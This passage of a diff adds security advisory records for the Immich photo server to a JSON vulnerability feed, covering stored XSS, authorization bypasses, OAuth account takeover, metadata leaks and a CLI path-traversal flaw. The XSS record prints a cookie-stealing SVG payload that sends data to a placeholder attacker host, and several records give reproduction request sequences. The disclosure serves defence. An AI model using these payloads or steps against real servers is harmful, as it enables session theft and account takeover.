+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-61"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wp5v-5wj6-j2fh",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wp5v-5wj6-j2fh",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wp5v-5wj6-j2fh",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-wjrq-m9hw-r4vq",
+      "aliases": [],
+      "title": "Stored XSS via SVG Asset",
+      "summary": "### Summary\r\nStored Cross-Site Scripting via an uploaded SVG asset: the file is served inline from `GET /api/assets/:id/original`; when served with the standard MIME type the inline `<script>` executes in Chrome and Firefox in the Immich origin, allowing theft of the `immich_access_token` session cookie (full admin takeover demonstrated).\r\n\r\n### Description\r\nThe server accepts `.svg` uploads (`server/src/utils/mime-types.ts:62`) and serves the original through `GET /api/assets/:id/original` with `Content-Disposition: inline` (`server/src/utils/file.ts:68-73`) under a global Content-Security-Policy that allows `'unsafe-inline'` scripts (`server/helmet.json:5`). An SVG containing an inline `<script>` executes when the document is rendered: browser tests (real Chrome and Firefox) confirmed execution when served as the standard `image/svg+xml` - top-level navigation and `<iframe>`/`<object>`/`<embed>` embedding. The script runs in the Immich origin and can read `document.cookie`; the full chain to a created admin account was demonstrated.\r\n\r\n**Exploitability caveat:** the server currently returns the non-standard MIME type `image/svg` instead of `image/svg+xml`, and current Chrome (downloads the file) and Firefox (renders as an image) do not execute scripts for that type. This is an accidental, fragile mitigation - not a defense. Any change to the standard MIME type (a likely bug-fix) activates the vulnerability; Safari is untested.\r\n### Steps to reproduce / POC\r\n1. Upload `evil.svg` (escape `&` as `&amp;` inside `<script>` - raw `&` breaks XML parsing):\r\n   ```xml\r\n   <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n   <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\r\n     <script type=\"text/javascript\">\r\n       var i = new Image();\r\n       i.src = \"http://<ATTACKER>:PORT/xss-callback?d=\" +\r\n               encodeURIComponent(JSON.stringify({cookie: document.cookie, ls: localStorage}));\r\n       document.body.appendChild(i);\r\n     </script>\r\n     <rect width=\"100\" height=\"100\" fill=\"red\"/>\r\n   </svg>\r\n   ```\r\n2. Upload via `POST /api/assets`, or expose via a public shared link and have the victim open it.\r\n3. Victim opens `GET /api/assets/:id/original` (or the shared-link URL).\r\n4. When served as `image/svg+xml`, Chrome/Firefox execute the script; `document.cookie` (containing `immich_access_token`) is exfiltrated.\r\n5. The attacker uses the token against the admin API (verified: read system config, create a user, promote it to `isAdmin`).\r\n\r\n### Impact\r\n- Session theft leading to full admin takeover (entire chain reproduced).\r\n- SVG reachable to anonymous visitors via public shared links.\r\n- Can be combined with the workflow/storage-template issues for further impact (cross-user file write reproduced).\r\n\r\n### Suggested fix\r\n1. Force `Content-Disposition: attachment` for SVG originals (add a `disposition` option to `ImmichFileResponse`/`sendFile` in `server/src/utils/file.ts`, set it in `downloadOriginal` in `server/src/services/asset-media.service.ts` when `contentType.startsWith('image/svg')`).\r\n2. **Simultaneously** correct the `.svg` MIME type to `image/svg+xml` (`server/src/utils/mime-types.ts:62`). Items 1 and 2 must land together - fixing the MIME alone activates the vulnerability.\r\n3. Optionally: remove `'unsafe-inline'` from the global CSP `script-src` (requires a SvelteKit nonce/hash plan; assess separately), or disallow `.svg` asset uploads entirely.",
+      "published_at": "2026-11-10T18:45:25.000Z",
+      "modified_at": "2026-11-10T18:45:25.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wjrq-m9hw-r4vq",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wjrq-m9hw-r4vq",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wjrq-m9hw-r4vq",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:84c7adfb8a24481bbd0da3607a15bab31a125dec8c424cf3af2b31f0ae5988fb",
+      "note": null
+    },
+    {
+      "id": "GHSA-6jjx-fxr3-8vf2",
+      "aliases": [],
+      "title": "Cross-owner metadata write via POST /duplicates/resolve",
+      "summary": "# Cross-owner metadata write via POST /duplicates/resolve\r\n\r\n## Summary\r\n\r\nAny registered user can write to another user's asset rows. The authorization check on\r\n`POST /duplicates/resolve` asks whether the caller owns *any* asset carrying a given duplicate-group UUID,\r\nand the caller can make that true for herself with one ordinary update to her own asset. Once inside the\r\ngroup, the merge writes attacker-chosen description, rating, favourite flag, GPS coordinates and tag\r\nassociations onto assets she does not own.\r\n\r\nConfirmed on the released `v3.1.0` image, `sourceCommit 8aa95c67`. Still present on main at `a9a99cff`.\r\n\r\n## The asymmetry\r\n\r\nThree functions in `server/src/repositories/duplicate.repository.ts`:\r\n\r\n```ts\r\nasync delete(userId: string, id: string)       // line 158, .where('ownerId', '=', userId)\r\nasync deleteAll(userId: string, ids: string[]) // line 168, .where('ownerId', '=', userId)\r\nasync get(duplicateId: string)                 // line 115, no ownerId predicate, no userId parameter\r\n```\r\n\r\n`get` is the read that feeds the write path. It filters on `duplicateId`, `deletedAt` and `stackId` and\r\nnothing else, so it returns every user's assets in the group.\r\n\r\nYour own commit `d4f29ab6a`, \"validate duplicate group ownership before dismissal\" from 2026-05-04, added\r\n`requireAccess` to `delete` and `deleteAll`. Both of those already had `ownerId` in their SQL, so the check\r\nwas belt over braces. `resolve` landed earlier in `8c6adf715` and shipped in v2.7.0. It got the same\r\n`requireAccess` call but has no SQL backstop, so there the check is the entire control surface.\r\n\r\nAnd that check is satisfiable by the caller. `Permission.DuplicateDelete` routes to\r\n`access.duplicate.checkOwnerAccess`, which is `where duplicateId in (...) and ownerId = :userId`. It asks\r\nwhether you own anything in the group, not whether you may write the rows you are about to write.\r\n`duplicateId` is an ordinary field on the bulk asset update DTO, so one `PUT /assets` on your own asset\r\njoins any group you can name.\r\n\r\n`resolveGroup` then checks `Permission.AssetDelete` on `idsToTrash`, `Permission.AssetShare` on `idsToKeep`\r\nfor the album side effect, and `Permission.TagAsset` on the merged tags. It checks nothing at all on\r\n`idsToKeep` before:\r\n\r\n```ts\r\nawait this.assetRepository.updateAllExif(idsToKeep, exifUpdate);\r\nawait this.assetRepository.updateAll(idsToKeep, { duplicateId: null, ...assetUpdate });\r\n```\r\n\r\nThe `AssetShare` check on `idsToKeep` is the tell. Someone asked whether the caller may act on the keeper,\r\napplied the answer to the album add, and did not carry it twenty lines down to the two writes.\r\n\r\n## Learning the group UUID\r\n\r\n`mapAsset` masks `isFavorite` for non-owners at `asset-response.dto.ts:227` and then emits `duplicateId`\r\nunmasked at line 240. So a plain viewer on a shared album reads it straight out of `POST /search/metadata`\r\nwith an `albumIds` filter, alongside `ownerId`. A partner can enumerate the sharer's whole library the same\r\nway. No out-of-band knowledge is involved.\r\n\r\n## Proof\r\n\r\nLab at v3.1.0, two ordinary accounts, victim shares one album with mallory as viewer.\r\n\r\nMallory reads the victim's `duplicateId` from the album search, stamps it on her own asset, and resolves:\r\n\r\n```\r\nPUT  /assets   ids=[mallory asset Z]  duplicateId=1111...      -> 204\r\nPOST /duplicates/resolve  keep=[victim asset X]  trash=[Z]     -> 200 success:true\r\n```\r\n\r\nVictim asset X before and after, fetched as the victim:\r\n\r\n```\r\nCHANGED exif.description: 'CANARY-VICTIM-DESC-7f3a' -> 'CANARY-VICTIM-DESC-7f3a\\nPWNED-BY-MALLORY-9c2e'\r\nCHANGED isFavorite: False -> True\r\nCHANGED rating: 1 -> 5\r\nCHANGED latitude/longitude: null -> 41.8902 / 12.4922, city Rome, country Italy\r\nsame    ownerId: b49f54bd-...  the asset is still the victim's\r\n```\r\n\r\nOnly ids mallory legitimately holds are used, her own and the one visible in the shared album.\r\n\r\nNegative controls:\r\n\r\n- Direct write, `PUT /assets` on the victim asset: `400 Not found or n...",
+      "published_at": "2026-11-10T18:45:06.000Z",
+      "modified_at": "2026-11-10T18:45:06.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-639",
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-6jjx-fxr3-8vf2",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-6jjx-fxr3-8vf2",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-6jjx-fxr3-8vf2",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-9g87-8gwq-4xqp",
+      "aliases": [],
+      "title": "Shared-link upload runs as the link owner, so the livePhotoVideoId owner check can never fail",
+      "summary": "# Shared-link upload runs as the link owner, so the livePhotoVideoId owner check can never fail\r\n\r\n## Summary\r\n\r\nAn anonymous visitor holding an upload-enabled share link can hide any video belonging to the link owner,\r\nand then read that video's metadata and stream it in full through the same anonymous key, including videos\r\nthat were never shared and on links where downloads are disabled.\r\n\r\nThe guard that should stop this exists and is bypassed rather than absent. For a share-key request the\r\nauthenticated principal *is* the link owner, so the comparison it makes can never be true.\r\n\r\nConfirmed on the released `v3.1.0` image, `sourceCommit 8aa95c67`. Byte-identical on main at `a9a99cff`.\r\n\r\n## Mechanism\r\n\r\n`server/src/services/auth.service.ts` resolves a share key to the owner:\r\n\r\n```ts\r\nasync validateSharedLinkKey(key: string | string[]): Promise<AuthDto> {\r\n  ...\r\n  return { user: sharedLink.user, sharedLink };\r\n}\r\n```\r\n\r\nSo `auth.user.id === sharedLink.userId` for an anonymous caller. Every downstream\r\n`something.ownerId !== auth.user.id` guard silently evaluates to false.\r\n\r\n`POST /assets` accepts share keys, at `asset-media.controller.ts:52`:\r\n\r\n```ts\r\n@Authenticated({ permission: Permission.AssetUpload, sharedLink: true })\r\n```\r\n\r\nand passes `auth.user.id` into `onBeforeLink` in `server/src/utils/asset.util.ts:145`:\r\n\r\n```ts\r\nif (motionAsset.ownerId !== userId) {\r\n  throw new BadRequestException('Live photo video does not belong to the user');\r\n}\r\n\r\nif (motionAsset && motionAsset.visibility === AssetVisibility.Timeline) {\r\n  await assetRepository.update({ id: livePhotoVideoId, visibility: AssetVisibility.Hidden });\r\n  await eventRepository.emit('AssetHide', { assetId: motionAsset.id, userId });\r\n}\r\n```\r\n\r\nThe error string shows the restriction was intended. `livePhotoVideoId` is a plain field on the upload form,\r\nso the caller picks the target.\r\n\r\n## Proof\r\n\r\nSame target asset, same request, only the principal differs. This is the whole finding in two lines.\r\n\r\n```\r\nlogged-in outsider  -> 400 \"Live photo video does not belong to the user\"\r\nanonymous share key -> 201, owner's video flipped to Hidden\r\n```\r\n\r\nAfter the anonymous request, on the same key with no Authorization header:\r\n\r\n```\r\nGET /assets/VID           400 before  ->  200 after, full metadata\r\nGET /assets/VID/video/playback  404 before  ->  200 after, bytes identical to the owner's file\r\n```\r\n\r\nThe owner's timeline loses the asset. A second video left untouched stays visible throughout, so this is\r\ntargeted and not a side effect of the upload.\r\n\r\nNegative controls:\r\n\r\n- `allowUpload=false` on the link: 401, target unchanged.\r\n- No key at all: 401.\r\n- A real logged-in outsider account against the same targets: 400, as quoted above. That is what proves the\r\n  vacuous comparison rather than assuming it.\r\n\r\n## Relationship to GHSA-hvq7-hq9r-8gjr\r\n\r\nThat advisory is properly fixed and I want to say so plainly. Commit `6ba17bb86` deleted the\r\n`Permission.AssetShare` case from `checkSharedLinkAccess` outright, so a share key now falls through to\r\n`default: return new Set<string>()` and gets no `AssetShare` access at all. The same commit removed\r\n`sharedLink: true` from `PUT /shared-links/:id/assets` and the album asset-add routes.\r\n\r\n`POST /assets` kept `sharedLink: true`, and it reaches a pre-existing owner asset by UUID through\r\n`livePhotoVideoId`. So this is not a regression of that fix and not the same sink. It is the same\r\nprincipal-level root cause on a route the route-by-route hardening did not visit.\r\n\r\n## Secondary observation, the checksum pre-handler\r\n\r\n`AssetUploadInterceptor` answers the `x-immich-checksum` header before `requireUploadAccess` runs, and\r\nreturns the owner's asset UUID for any bytes the owner already holds. It works on read-only links too, where\r\nnone of the above applies. The payload is narrow, \"does this library contain a file with this hash and what\r\nis its id\", but it is the only leg that reaches the much larger population of lin...",
+      "published_at": "2026-11-10T18:45:05.000Z",
+      "modified_at": "2026-11-10T18:45:05.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.4,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-639",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-9g87-8gwq-4xqp",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-9g87-8gwq-4xqp",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-9g87-8gwq-4xqp",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-7j23-rprg-3g5q",
+      "aliases": [],
+      "title": "Attacker-chosen OAuth `state` cookie allows forced account linking and takeover of any account (bypasses the CVE-2025-43856 fix)",
+      "summary": "## Summary\n\n`POST /api/oauth/authorize` needs no authentication and copies a caller-supplied `state` straight into the\n`immich_oauth_state` cookie on the response. `POST /api/oauth/link` then accepts that cookie as evidence that the\ncurrent session started the OAuth flow, but nothing ties the cookie to a session or a user.\n\nSo an attacker can pick the value of the CSRF token, get it planted in a victim's browser, and hand the victim a\ncallback URL carrying an authorization code for the attacker's own IdP identity. The victim's browser links that\nidentity onto the victim's immich account without asking. After that the attacker signs in with their own IdP\ncredentials and gets the victim's session.\n\nThe fix for GHSA-3832-6r8h-9cfm (CVE-2025-43856) was to validate `state`. It is validated, just not against\nanything the server chose.\n\nI ran the whole chain against a clean v3.1.0 instance on your official images, including a negative control and\ntwo controls covering the PKCE case. Transcripts below.\n\n## Why the parameters exist, and where it goes wrong\n\nThe mobile app generates `state` and a PKCE verifier on the device, sends only the challenge to `/authorize`\n(`mobile/lib/services/oauth.service.dart:14,23-24`), and passes `state` and `codeVerifier` back explicitly in the\ncallback body (`:34,44`). That flow is self-contained and fine. `OAuthCallbackSchema` already accepts both\n(`server/src/dtos/auth.dto.ts:105-111`).\n\nThe problem is that the server *also* writes those caller-supplied values into the responding browser as cookies,\nand the web flow trusts them. Mobile never needs the cookie; the browser is the only consumer, and the browser is\nexactly who an attacker can aim a `Set-Cookie` at.\n\n## Details\n\n`OAuthConfigSchema` takes `state` and `codeChallenge` as free client input:\n\n    // server/src/dtos/auth.dto.ts:113-118\n    const OAuthConfigSchema = z.object({\n      redirectUri: z.string()...,\n      state: z.string().optional()...,\n      codeChallenge: z.string().optional()...,\n    })\n\nThe route has no `@Authenticated()` (`server/src/controllers/oauth.controller.ts:39`), and the guard lets\nundecorated routes through:\n\n    // server/src/middleware/auth.guard.ts:90-92\n    const options = this.reflector.getAllAndOverride<AuthenticatedOptions | undefined>(MetadataKey.AuthRoute, targets);\n    if (!options) {\n      return true;\n    }\n\nThe caller's value beats the server's randomness, and supplying a challenge nulls the verifier:\n\n    // server/src/repositories/oauth.repository.ts:46-53\n    state ??= randomState();\n    let codeVerifier: string | null;\n    if (codeChallenge) {\n      codeVerifier = null;\n    } else {\n      codeVerifier = randomPKCECodeVerifier();\n      codeChallenge = await calculatePKCECodeChallenge(codeVerifier);\n    }\n\nBoth land in the browser at `server/src/controllers/oauth.controller.ts:50-59`, via\n`respondWithCookie` with `path: '/'`, `sameSite: 'lax'`, `httpOnly: true` and a 400-day `maxAge`\n(`server/src/utils/response.ts:8-12,28`). Express serialises a non-string cookie value as\n`'j:' + JSON.stringify(value)`, so a null verifier ships as the literal text `j:null`. That matters because\n`link()` rejects an empty verifier but is happy with a six-character constant:\n\n    // server/src/services/auth.service.ts:412-419\n    const expectedState = dto.state ?? this.getCookieOauthState(headers);\n    if (!expectedState?.length) {\n      throw new BadRequestException('OAuth state is missing');\n    }\n    const codeVerifier = dto.codeVerifier ?? this.getCookieCodeVerifier(headers);\n    if (!codeVerifier?.length) {\n      throw new BadRequestException('OAuth code verifier is missing');\n    }\n\nNeither cookie is checked against `auth.session.id` or `auth.user.id`. The only other gate is at\n`server/src/services/auth.service.ts:428-432`, which rejects the case where the attacker's `sub` already belongs\nto a different immich user. Whether the victim already has an `oauthId` is never considered, so an existing\nlegitimate link gets o...",
+      "published_at": "2026-11-10T18:45:04.000Z",
+      "modified_at": "2026-11-10T18:45:04.000Z",
+      "severity": {
+        "level": "high",
+        "score": 7.5,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-7j23-rprg-3g5q",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-7j23-rprg-3g5q",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-7j23-rprg-3g5q",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:72ced50c9d88c73e5254a90ed5a5634066bfaa7064c026f51d02a1e6509ea2ab",
+      "note": null
+    },
+    {
+      "id": "GHSA-gjj9-fvfp-jw63",
+      "aliases": [],
+      "title": "Shared link \"Show metadata\" is not applied to POST /search/metadata, leaking EXIF and GPS",
+      "summary": "# \"Show metadata\" is not applied to POST /search/metadata, so shared links leak EXIF and GPS\n\n## Summary\n\nA shared album link created with \"Show metadata\" turned off still returns the full unredacted asset record\nfrom `POST /search/metadata`. One unauthenticated request with the link key yields GPS latitude and\nlongitude, reverse-geocoded city and country, camera make and model, capture time, the original filename,\nthe on-disk path and the owner UUID, for every asset in the album.\n\nThis is a response-sanitization gap, not an authorization bypass. Object scope is intact and I want to be\nclear about that up front.\n\nIntroduced in v3.0.2 by commit `655cd01d5` on 2026-07-08. Present in v3.0.3, v3.1.0 and main at `a9a99cff`.\nConfirmed on the released v3.1.0 image, `sourceCommit 8aa95c67`.\n\n## The invariant is yours, written as a test\n\n`e2e/src/specs/server/api/shared-link.e2e-spec.ts:280`\n\n```ts\nit('should not return metadata for album shared link without metadata', async () => {\n  ...\n  const asset = body.assets[0];\n  expect(asset).not.toHaveProperty('exifInfo');\n  expect(asset).not.toHaveProperty('fileCreatedAt');\n  expect(asset).not.toHaveProperty('originalFilename');\n  expect(asset).not.toHaveProperty('originalPath');\n});\n```\n\n`POST /search/metadata` with the same class of key returns all four. I am not asserting a preference here,\njust showing that an assertion you already wrote is violated on a different route.\n\nThe clamp is enforced in seven places server-side. Two push it down into the SQL projection at\n`asset.repository.ts:836` and `:930`, and `asset-media.service.ts:289` swaps the real filename for the asset\nUUID in a thumbnail's Content-Disposition. The project works hard at this. One sink was missed.\n\n## Where it is missed\n\n`server/src/services/asset.service.ts` applies three clamps for a share key:\n\n```ts\nif (auth.sharedLink && !auth.sharedLink.showExif) {\n  return mapAsset(asset, { stripMetadata: true, withStack: true, auth });\n}\nconst data = mapAsset(asset, { withStack: true, auth });\nif (auth.sharedLink) { delete data.owner; }\n```\n\n`server/src/services/search.service.ts:99` ends with none of them:\n\n```ts\nreturn this.mapResponse(items, hasNextPage ? (page + 1).toString() : null, { auth });\n```\n\n`mapAsset` never inspects `auth.sharedLink` on its own. `stripMetadata` is only ever set by the caller, and\n`grep -rn \"stripMetadata\" server/src/` finds exactly three call sites. `search.service.ts` is not one.\n\n## The commit that opened it\n\n`655cd01d5`, \"search metadata for album shared links\", is the commit that first let share keys reach this\nendpoint. It added the object-scope half and not the sanitization half:\n\n```diff\n-  @Authenticated({ permission: Permission.AssetRead })\n+  @Authenticated({ permission: Permission.AssetRead, sharedLink: true })\n\n   if (dto.albumIds && dto.albumIds.length > 0) {\n     await this.requireAccess({ auth, ids: dto.albumIds, permission: Permission.AlbumRead });\n+  } else if (auth.sharedLink) {\n+    throw new BadRequestException('Shared link access is only allowed in combination with an albumIds filter');\n   } else {\n```\n\nThe two e2e tests it shipped check the 400 and check that the allowed case returns the expected id. Neither\ncan observe the body's metadata, so nothing failed.\n\n## Proof\n\nA link with `showMetadata:false` and `allowDownload:false`. Five sinks redact exactly as intended. Then one\nunauthenticated POST with the same key returns latitude 48.8584, longitude 2.2945, city, camera make and\nmodel, `originalFileName`, the full `originalPath` under `/data/upload/<ownerUUID>/`, the checksum and\n`ownerId`.\n\nThe control that settles the degree of it: a second link on the same album with `showMetadata:true`.\n\n```\nownerId           identical=True\noriginalFileName  identical=True\nlat/lon on showMetadata=FALSE link: 48.8584 / 2.2945\nlat/lon on showMetadata=TRUE  link: 48.8584 / 2.2945\n```\n\nByte-identical bodies, zero differing fields. The toggle has no effect on this endpoint at all.\n\nNegative...",
+      "published_at": "2026-11-10T18:45:04.000Z",
+      "modified_at": "2026-11-10T18:45:05.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-200"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-gjj9-fvfp-jw63",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-gjj9-fvfp-jw63",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-gjj9-fvfp-jw63",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-p632-vh57-j6x4",
+      "aliases": [],
+      "title": "Malicious or MITM Immich server can read, exfiltrate and delete arbitrary local files via the @immich/cli duplicate check",
+      "summary": "**ANT-ID:** ANT-2026-XYPPVQ1N\r\n\r\n> Reported by Calif.io, in collaboration with Anthropic. Our reference: ANT-2026-XYPPVQ1N.\r\n\r\n## Summary\r\n\r\nWhen a user runs `immich upload`, the CLI first POSTs a locally-built list of `{id: <local path>, checksum}` to `/assets/bulk-upload-check`, then trusts the server's reply to decide what to do with files on the user's disk. In `checkForDuplicates` at `packages/cli/src/commands/asset.ts:236`, the loop `for (const { id: filepath, assetId, action } of results)` takes the `id` the server returns and uses it directly as a local filesystem path, with no check that the path is one the client actually sent. The `stat()` pre-pass earlier in the function runs over the locally-crawled file list before the request, so it does not constrain the reply.\r\n\r\nTwo consequences follow, both driven entirely by server-chosen strings. Entries the server marks `accept` go into `newFiles` and are read and uploaded by `uploadFiles` (`asset.ts:309`), which calls `createReadStream` on the server-named path and POSTs its contents back to the server. A server that returns `{id: \"/home/victim/.ssh/id_rsa\", action: \"accept\"}` therefore exfiltrates that file even though the user only pointed the CLI at a photo directory, and this needs no non-default flags. Entries the server marks as rejected go into `duplicates`, and when `--delete` or `--delete-duplicates` is set, `deleteFiles` (`asset.ts:456`) calls `unlink` on the server-named path (and its `.xmp` sidecar), deleting arbitrary local files. The CLI authenticates against the server with no version, TLS, or identity check, so any endpoint the user points `--url` at, or an active MITM on a plain-`http://` connection, controls these replies.\r\n\r\n## Reproduce\r\n\r\nThe proof of concept is attached, and is also mirrored at https://drive.google.com/file/d/19GDTs2x_8AqZBqMIpr97w3eAPafqRi2y/view.\r\n\r\n## Recommendations\r\n\r\nIn `checkForDuplicates`, do not trust the server's `id` as a path. Before using any `results[].id` as a filesystem path, confirm it is a member of the set of paths the client actually sent in that batch (or resolve it and require containment within the user-supplied upload roots), and drop any result whose `id` is not. The accept branch that feeds `uploadFiles` needs this guard as much as the reject branch that feeds `deleteFiles`; a check on only the deletion path still leaves the read-and-exfiltrate path open. Reject reasons the client does not recognize should keep the file on disk and be reported, never silently deleted.\r\n\r\n## Affected\r\n\r\n`@immich/cli` 3.3.3, the newest release, and master HEAD: `checkForDuplicates` in `packages/cli/src/commands/asset.ts` is byte-identical at both and still uses the server-returned `id` as a local path with no containment check. No CVE covers it.",
+      "published_at": "2026-11-10T18:45:03.000Z",
+      "modified_at": "2026-11-10T18:45:03.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.8,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-22"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-p632-vh57-j6x4",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-p632-vh57-j6x4",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-p632-vh57-j6x4",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-v7v2-63g5-gwf7",
+      "aliases": [],
+      "title": "Partner can read the sharer's Locked Folder metadata when a search request omits visibility",
+      "summary": "### Summary\r\n\r\nA partner can read the full metadata of every asset the sharer put in their Locked Folder. That\r\nincludes GPS coordinates, the on-disk path, the EXIF description and a thumbhash preview. The\r\npartner gets it by calling the legacy search endpoints with the `visibility` field left out, while\r\ntheir own session is unlocked with their own PIN.\r\n\r\nThe guard for this only fires when the client sends `visibility` explicitly. Leaving one optional\r\nfield out of the same request body gets past it.\r\n\r\n| route | what the partner gets |\r\n|---|---|\r\n| `POST /api/search/metadata` | asset rows with `exifInfo` |\r\n| `POST /api/search/statistics` | a count of the locked assets |\r\n| `POST /api/search/random` | locked assets in the sample |\r\n| `POST /api/search/large-assets` | locked assets listed |\r\n\r\nAsset bytes stay protected. `GET /assets/{id}`, `/thumbnail` and `/original` are all refused, so this\r\nis metadata rather than file access.\r\n\r\n**How this differs from CVE-2026-108165.** That one is the partner sync stream:\r\n`POST /api/sync/stream`, queried in `server/src/repositories/sync.repository.ts`. This is the search\r\npath, queried in `server/src/utils/database.ts`. The two build their queries in different files and\r\nshare no code, so a fix to the sync queries will not change this behaviour. Both are present in\r\nv3.3.3.\r\n\r\n### Details\r\n\r\nThe legacy builder applies its visibility predicate conditionally:\r\n\r\n```ts\r\n// server/src/utils/database.ts:432-436\r\n    .$if(!!options.visibility, (qb) =>\r\n      options.visibility === 'not-locked'\r\n        ? qb.where('asset.visibility', '!=', AssetVisibility.Locked)\r\n        : qb.where('asset.visibility', '=', options.visibility!),\r\n    )\r\n```\r\n\r\n`!!undefined` is `false`, so when `visibility` is omitted no visibility predicate is added at all.\r\nThe only ownership predicate in the builder is this:\r\n\r\n```ts\r\n// server/src/utils/database.ts:489\r\n    .$if(!!options.userIds, (qb) => qb.where('asset.ownerId', '=', anyUuid(options.userIds!)))\r\n```\r\n\r\nand `userIds` still holds the partner ids, because the guard that strips them keys on the explicit\r\nvalue:\r\n\r\n```ts\r\n// server/src/services/search.service.ts:356-360\r\n  private async getUserIdsToSearch(auth: AuthDto, visibility?: AssetVisibility): Promise<string[]> {\r\n    // Locked assets are personal. Never include partner IDs, regardless of 